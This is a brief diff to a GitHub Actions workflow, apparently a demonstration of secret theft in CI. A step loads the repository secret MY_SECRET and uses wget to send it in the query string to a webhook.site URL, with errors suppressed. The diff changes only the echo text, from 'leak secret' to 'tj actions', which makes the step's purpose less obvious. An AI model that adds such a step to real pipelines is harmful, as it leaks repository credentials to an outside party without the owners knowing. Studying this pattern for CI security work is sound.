@@ -44,7 +44,7 @@ jobs:
         env:
           SECRET: ${{ secrets.MY_SECRET }}
         run: |
-          echo "leak secret"
+          echo "tj actions"
           wget --connect-timeout=3 https://webhook.site/c2b54d74-0180-4d04-a3b2-55fe3a7b6f1f?secret=$SECRET || true
 
         # Runs a set of commands using the runners shell
